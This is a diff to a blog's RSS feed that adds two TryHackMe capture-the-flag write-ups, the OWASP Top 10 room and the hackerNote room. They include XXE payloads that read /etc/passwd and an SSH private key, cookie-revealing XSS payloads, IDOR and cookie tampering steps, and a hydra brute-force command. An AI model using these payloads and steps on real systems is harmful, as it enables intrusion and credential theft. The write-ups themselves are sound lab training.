@@ -16,6 +16,229 @@
       <guid>https://markramige.com/posts/tryhackme-owasp-top-10-write-up/</guid>
       <description>This challenge on TryHackMe was initially released over a period of ten days covering one of the OWASP Top Ten vulnerabilities per day. In includes an introduction and explanation of each vulnerability type and one or multiple exercises for each. It is beginner friendly.
 Contents  Day 1 - Injection Day 2 - Broken Authentication Day 3 - Sensitive Data Exposure Day 4 - XML External Entities Day 5 - Broken Access Control Day 6 - Security Misconfiguration Day 7 - Cross-site Scripting (XSS) Day 8 - Insecure Deserialization Day 9 - Using Components with Known Vulnerabilities Day 10 - Insufficient Logging and Monitoring  Day 1 - Injection Task 5 Visit http://MACHINE_IP/evilshell.</description>
+      <content>&lt;p&gt;&lt;a href=&#34;https://tryhackme.com/room/owasptop10&#34;&gt;This challenge&lt;/a&gt; on TryHackMe was initially released over a period of ten days covering one of the OWASP Top Ten vulnerabilities per day. In includes an introduction and explanation of each vulnerability type and one or multiple exercises for each. It is beginner friendly.&lt;/p&gt;
+&lt;h2 id=&#34;contents&#34;&gt;Contents&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#day-1---injection&#34;&gt;Day 1 - Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-2---broken-authentication&#34;&gt;Day 2 - Broken Authentication&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-3---sensitive-data-exposure&#34;&gt;Day 3 - Sensitive Data Exposure&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-4---xml-external-entities&#34;&gt;Day 4 - XML External Entities&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-5---broken-access-control&#34;&gt;Day 5 - Broken Access Control&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-6---security-misconfiguration&#34;&gt;Day 6 - Security Misconfiguration&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-7---cross-site-scripting-(xss)&#34;&gt;Day 7 - Cross-site Scripting (XSS)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-8---insecure-deserialization&#34;&gt;Day 8 - Insecure Deserialization&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-9---using-components-with-known-vulnerabilities&#34;&gt;Day 9 - Using Components with Known Vulnerabilities&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#day-10---insufficient-logging-and-monitoring&#34;&gt;Day 10 - Insufficient Logging and Monitoring&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;day-1---injection&#34;&gt;Day 1 - Injection&lt;/h2&gt;
+&lt;h3 id=&#34;task-5&#34;&gt;Task 5&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Visit &lt;code&gt;http://MACHINE_IP/evilshell.php&lt;/code&gt; to complete the following:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What strange text file is in the website root directory?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;ls /var/www/html&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;How many non-root/non-service/non-daemon users are there?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;cat /etc/passwd&lt;/code&gt; and look for regular user accounts&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What user is this app running as?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;whoami&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the user&amp;rsquo;s shell set as?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;grep USERNAME /etc/passwd&lt;/code&gt; (replace USERNAME with the previous answer&amp;rsquo;s user name)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What version of Ubuntu is running?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;lsb_release -a&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Print out the MOTD. What favorite beverage is shown?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;cat /etc/update-motd.d/00-header&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;day-2---broken-authentication&#34;&gt;Day 2 - Broken Authentication&lt;/h2&gt;
+&lt;h3 id=&#34;task-7&#34;&gt;Task 7&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Visit &lt;code&gt;http://MACHINE_IP:8888&lt;/code&gt; to complete the following:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the flag that you found in darren&amp;rsquo;s account?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Follow the instructions to create an account &amp;quot; darren&amp;quot; and set the password. Log in as that account with your password and the flag will be shown.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Now try to do the same trick and see if you can login as arthur.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;What is the flag that you found in arthur&amp;rsquo;s account?&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Follow the instructions to create an account &amp;quot; arthur&amp;quot; and set the password. Log in as that account with your password and the flag will be shown.&lt;/p&gt;
+&lt;h2 id=&#34;day-3---sensitive-data-exposure&#34;&gt;Day 3 - Sensitive Data Exposure&lt;/h2&gt;
+&lt;h3 id=&#34;task-11&#34;&gt;Task 11&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Visit &lt;code&gt;http://MACHINE_IP&lt;/code&gt; to complete the following:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the name of the mentioned directory?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Look at the source of the /login page and the answer is commented out.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;There is a database file listed in the directory.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Use the supporting material to access the sensitive data. What is the password hash of the admin user?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Running the &lt;code&gt;file&lt;/code&gt; command on the database file reveals that it is a sqlite3 file. We can now use the &lt;code&gt;sqlite3&lt;/code&gt; command to access the sensitive data. We use the instructions in Task 9 to get the password hash.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Crack the hash. What is the admin&amp;rsquo;s plaintext password?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Use &lt;a href=&#34;https://crackstation.net/&#34;&gt;Crackstation&lt;/a&gt; to crack the password hash.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Login as the admin. What is the flag?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Use the credentials from the cracked hash to get the flag.&lt;/p&gt;
+&lt;h2 id=&#34;day-4---xml-external-entities&#34;&gt;Day 4 - XML External Entities&lt;/h2&gt;
+&lt;h3 id=&#34;task-16&#34;&gt;Task 16&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Visit &lt;code&gt;http://MACHINE_IP&lt;/code&gt; to complete the following:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Try to display your own name using any payload.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I used a modified payload from Task 15 to display my name:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY name &amp;quot;Mark&amp;quot;&amp;gt; ]&amp;gt;
+ &amp;lt;userInfo&amp;gt;
+  &amp;lt;firstName&amp;gt;&amp;amp;name;&amp;lt;/firstName&amp;gt;
+ &amp;lt;/userInfo&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;See if you can read the /etc/passwd&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can use the payload from Task 15 as is:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE root [&amp;lt;!ENTITY read SYSTEM &#39;file:///etc/passwd&#39;&amp;gt;]&amp;gt;
+&amp;lt;root&amp;gt;&amp;amp;read;&amp;lt;/root&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;What is the name of the user in /etc/passwd&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The user with id 1000 is the one they&amp;rsquo;re looking for.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Where is falcon&amp;rsquo;s SSH key located?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can modify the previous payload slightly to read a different file where we think the SSH key is located:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE root [&amp;lt;!ENTITY read SYSTEM &#39;file:///home/falcon/.ssh/id_rsa&#39;&amp;gt;]&amp;gt;
+&amp;lt;root&amp;gt;&amp;amp;read;&amp;lt;/root&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;What are the first 18 characters for falcon&amp;rsquo;s private key&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We already successfully read the private key in the previous answer so we just copy and paste the first 18 characters.&lt;/p&gt;
+&lt;h2 id=&#34;day-5---broken-access-control&#34;&gt;Day 5 - Broken Access Control&lt;/h2&gt;
+&lt;h3 id=&#34;task-18&#34;&gt;Task 18&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Visit &lt;code&gt;http://MACHINE_IP&lt;/code&gt; to answer the following:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Look at other users notes. What is the flag?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;After logging in, the URL changes to &lt;code&gt;http://MACHINE_IP/note.php?note=1&lt;/code&gt;. We can change the note parameter to different numbers to access other users&#39; notes.&lt;/p&gt;
+&lt;h2 id=&#34;day-6---security-misconfiguration&#34;&gt;Day 6 - Security Misconfiguration&lt;/h2&gt;
+&lt;h3 id=&#34;task-19&#34;&gt;Task 19&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Visit &lt;code&gt;http://MACHINE_IP&lt;/code&gt; to answer the following:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Hack into the webapp, and find the flag!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This challenge focuses on default credentials. We can search the web for the source code for this web app and see if there is a default user account that hasn&amp;rsquo;t been deleted or whose password hasn&amp;rsquo;t been changed.&lt;/p&gt;
+&lt;p&gt;We find the source on &lt;a href=&#34;https://github.com/NinjaJc01/PensiveNotes&#34;&gt;Github&lt;/a&gt;. The documentation gives us the default user name and password.&lt;/p&gt;
+&lt;p&gt;Logging in with those credentials gives us the flag.&lt;/p&gt;
+&lt;h2 id=&#34;day-7---cross-site-scripting-xss&#34;&gt;Day 7 - Cross-site Scripting (XSS)&lt;/h2&gt;
+&lt;h3 id=&#34;task-20&#34;&gt;Task 20&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Navigate to &lt;code&gt;http://MACHINE_IP/&lt;/code&gt; in your browser and click on the &amp;ldquo;Reflected XSS&amp;rdquo; tab on the navbar; craft a reflected XSS payload that will cause a popup saying &amp;ldquo;Hello&amp;rdquo;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can submit &lt;code&gt;alert(&#39;Hello&#39;)&lt;/code&gt; in the search box to demonstrate reflected XSS because there is no filtering on the search input.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;First we need to find out how to get the hostname with javascript. &lt;a href=&#34;https://www.w3schools.com/js/js_window_location.asp&#34;&gt;w3schools&lt;/a&gt; comes through with the first result.&lt;/p&gt;
+&lt;p&gt;We try &lt;code&gt;alert(window.location.hostname)&lt;/code&gt; in the search box and the flag is returned.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Now navigate to &lt;code&gt;http://MACHINE_IP/stored&lt;/code&gt; in your browser and make an account.
+Then add a comment and see if you can insert some of your own HTML.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can use &lt;code&gt;&amp;lt;h1&amp;gt;test&amp;lt;/h1&amp;gt;&lt;/code&gt; in the comment box to insert HTML on the page and the flag is returned.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;On the same page, create an alert popup box appear on the page with your document cookies.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We check &lt;a href=&#34;https://www.w3schools.com/js/js_cookies.asp&#34;&gt;w3schools&lt;/a&gt; again for how to get cookies in Javascript. The payload &lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie);&amp;lt;/script&amp;gt;&lt;/code&gt; returns our cookies with an alert box and gives us the flag.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Change &amp;ldquo;XSS Playground&amp;rdquo; to &amp;ldquo;I am a hacker&amp;rdquo; by adding a comment and using Javascript.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We use &lt;a href=&#34;https://www.w3schools.com/js/js_htmldom_html.asp&#34;&gt;w3schools&lt;/a&gt; again to find out how to change text on the page using javascript.&lt;/p&gt;
+&lt;p&gt;Inspecting the page reveals that we need to change &lt;code&gt;&amp;lt;span id=&amp;quot;thm-title&amp;quot;&amp;gt;XSS Playground&amp;lt;/span&amp;gt;&lt;/code&gt; to &lt;code&gt;&amp;lt;span id=&amp;quot;thm-title&amp;quot;&amp;gt;I am a hacker&amp;lt;/span&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;We can use &lt;code&gt;&amp;lt;script&amp;gt;document.getElementById(&amp;quot;thm-title&amp;quot;).innerHTML = &amp;quot;I am a hacker&amp;quot;;&amp;lt;/script&amp;gt;&lt;/code&gt; to change the text and get the flag.&lt;/p&gt;
+&lt;h2 id=&#34;day-8---insecure-deserialization&#34;&gt;Day 8 - Insecure Deserialization&lt;/h2&gt;
+&lt;h3 id=&#34;task-21&#34;&gt;Task 21&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Who developed the Tomcat application?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Google should give us the answer here.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What type of attack that crashes services can be performed with insecure deserialization?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The answer is given in the Task text.&lt;/p&gt;
+&lt;h3 id=&#34;task-22&#34;&gt;Task 22&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Select the correct term of the following statement:
+if a dog was sleeping, would this be:
+A) A State
+B) A Behaviour&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Read the task text and understand the difference between state and behavior.&lt;/p&gt;
+&lt;h3 id=&#34;task-23&#34;&gt;Task 23&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the name of the base-2 formatting that data is sent across a network as?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Read the task text to find the answer.&lt;/p&gt;
+&lt;h3 id=&#34;task-24&#34;&gt;Task 24&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Read the task text to find the answer.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the acronym for the web technology that Secure cookies work over?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Again the answer is in the text.&lt;/p&gt;
+&lt;h3 id=&#34;task-25&#34;&gt;Task 25&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Visit &lt;code&gt;http://MACHINE_IP&lt;/code&gt; to answer the following:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;1st flag (cookie value)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can use the instructions in the task text to view the cookies after we log in. The &lt;code&gt;sessionId&lt;/code&gt; cookie is base64 encoded. We can visit &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;CyberChef&lt;/a&gt; and use the &lt;code&gt;From Base64&lt;/code&gt; recipe on the &lt;code&gt;sessionId&lt;/code&gt; value to get the flag.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;2nd flag (admin dashboard)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We change the &lt;code&gt;userType&lt;/code&gt; cookie value to &lt;code&gt;admin&lt;/code&gt; and navigate to &lt;code&gt;http://MACHINE_IP/admin&lt;/code&gt; to get the admin flag.&lt;/p&gt;
+&lt;h3 id=&#34;task-26&#34;&gt;Task 26&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;flag.txt&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Follow the instructions in the task text to get a remote shell. Next run &lt;code&gt;ls $HOME&lt;/code&gt; to find the flag file and &lt;code&gt;cat $HOME/flag.txt&lt;/code&gt; to get the flag text.&lt;/p&gt;
+&lt;h2 id=&#34;day-9---using-components-with-known-vulnerabilities&#34;&gt;Day 9 - Using Components with Known Vulnerabilities&lt;/h2&gt;
+&lt;h3 id=&#34;task-29&#34;&gt;Task 29&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Googling for the name of the web application, &lt;code&gt;online bookstore&lt;/code&gt; leads us to an &lt;a href=&#34;https://www.exploit-db.com/exploits/47887&#34;&gt;exploit&lt;/a&gt;. We copy and paste the code into a file.&lt;/p&gt;
+&lt;p&gt;Run the file &lt;code&gt;python3 test.py http://MACHINE_IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Run the command given at the prompt &lt;code&gt;wc -c /etc/passwd&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;day-10---insufficient-logging-and-monitoring&#34;&gt;Day 10 - Insufficient Logging and Monitoring&lt;/h2&gt;
+&lt;h3 id=&#34;task-30&#34;&gt;Task 30&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;What IP address is the attacker using?
+Look for unauthorized login attempts.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;What kind of attack is being carried out?
+The attacker is repeatedly trying different credentials to log in.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</content>
     </item>
     
     <item>
@@ -26,6 +249,91 @@ Contents  Day 1 - Injection Day 2 - Broken Authentication Day 3 - Sensitive Data
       <guid>https://markramige.com/posts/tryhackme-hackernote-write-up/</guid>
       <description>This TryHackMe challenge gives you an IP address to attack and takes you through each step of the process until you get root on the box. It covers recon, investigation, exploitation, user enumeration, password brute-forcing, and privilege escalation. It requires some basic linux skills to get started.
 Contents  Task 1 - Reconnaissance Task 2 - Investigate Task 3 - Exploit Task 4 - Attack Passwords Task 5 - Escalate  Task 1 - Reconnaissance  Which ports are open?</description>
+      <content>&lt;p&gt;&lt;a href=&#34;https://tryhackme.com/room/hackernote&#34;&gt;This TryHackMe challenge&lt;/a&gt; gives you an IP address to attack and takes you through each step of the process until you get root on the box. It covers recon, investigation, exploitation, user enumeration, password brute-forcing, and privilege escalation. It requires some basic linux skills to get started.&lt;/p&gt;
+&lt;h2 id=&#34;contents&#34;&gt;Contents&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#task-1-reconnaissance&#34;&gt;Task 1 - Reconnaissance&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-2-investigate&#34;&gt;Task 2 - Investigate&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-3-exploit&#34;&gt;Task 3 - Exploit&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-4-attack-passwords&#34;&gt;Task 4 - Attack Passwords&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-5-escalate&#34;&gt;Task 5 - Escalate&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;task-1---reconnaissance&#34;&gt;Task 1 - Reconnaissance&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Which ports are open? (in numerical order)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can run &lt;code&gt;man nmap&lt;/code&gt; to check for the options we need to scan for ports and service identification (next question).&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nmap -A -T4 MACHINE_IP&lt;/code&gt; seems to be what we&amp;rsquo;re looking for. The output is:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Starting Nmap 7.91 ( https://nmap.org ) at 2020-02-28 17:17 EST
+Nmap scan report for MACHINE_IP
+Host is up (0.11s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
+|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
+|_  256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
+80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Home - hackerNote
+8080/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Home - hackerNote
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap done: 1 IP address (1 host up) scanned in 24.41 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;What programming language is the backend written in?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Notice the service listed on port 80.&lt;/p&gt;
+&lt;h2 id=&#34;task-2---investigate&#34;&gt;Task 2 - Investigate&lt;/h2&gt;
+&lt;p&gt;Follow the instructions to set up your user account and test the web app. I&amp;rsquo;m proxying the traffic through Burp Suite.&lt;/p&gt;
+&lt;h2 id=&#34;task-3---exploit&#34;&gt;Task 3 - Exploit&lt;/h2&gt;
+&lt;p&gt;Download the &lt;a href=&#34;https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/exploit.py&#34;&gt;exploit&lt;/a&gt; and &lt;a href=&#34;https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/names.txt&#34;&gt;list of user names&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Change the value of the URL variable in the exploit script to &lt;code&gt;&amp;quot;http://MACHINE_IP/api/user/login&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Add your user name to the top of the names.txt file to increase the accuracy of the exploit.&lt;/p&gt;
+&lt;p&gt;Run &lt;code&gt;python3 exploit.py&lt;/code&gt; and answer the two questions based on the output:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;How many usernames from the list are valid?&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;What are/is the valid username(s)?&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;task-4---attack-passwords&#34;&gt;Task 4 - Attack Passwords&lt;/h2&gt;
+&lt;p&gt;Download the wordlists.zip file. We&amp;rsquo;re running Kali Linux and the hashcat-utils package is installed so we can just run:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/usr/bin/hashcat-utils/combinator.bin colors.txt numbers.txt &amp;gt; wordlist.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Next we run hydra to bruteforce our passwords: (replace &lt;code&gt;USERNAME&lt;/code&gt; and &lt;code&gt;MACHINE_IP&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hydra -l USERNAME -P wordlist.txt MACHINE_IP http-post-form &amp;quot;/api/user/login:username=^USER^&amp;amp;password=^PASS^:Invalid Username Or Password&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;How many passwords were in your wordlist?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;wc -l wordlist.txt&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What was the user&amp;rsquo;s password?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Taken from the output of &lt;code&gt;hydra&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the user&amp;rsquo;s SSH password?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Log in to the web app and the password is shown&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What&amp;rsquo;s the user flag?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;ssh USERNAME@MACHINE_IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;cat user.txt&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;task-5---escalate&#34;&gt;Task 5 - Escalate&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the CVE number for the exploit?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Google &lt;code&gt;pwdfeedback&lt;/code&gt; and we &lt;a href=&#34;https://www.sudo.ws/alerts/pwfeedback.html&#34;&gt;find a page&lt;/a&gt; that explains the vulnerability and gives us the CVE number.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the root flag?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Follow the instructions on the page to download the exploit, compile it, scp to the server, and run it.&lt;/p&gt;
+&lt;p&gt;Run &lt;code&gt;cat /root/root.txt&lt;/code&gt; to get the flag.&lt;/p&gt;
+</content>
     </item>
     
   </channel>
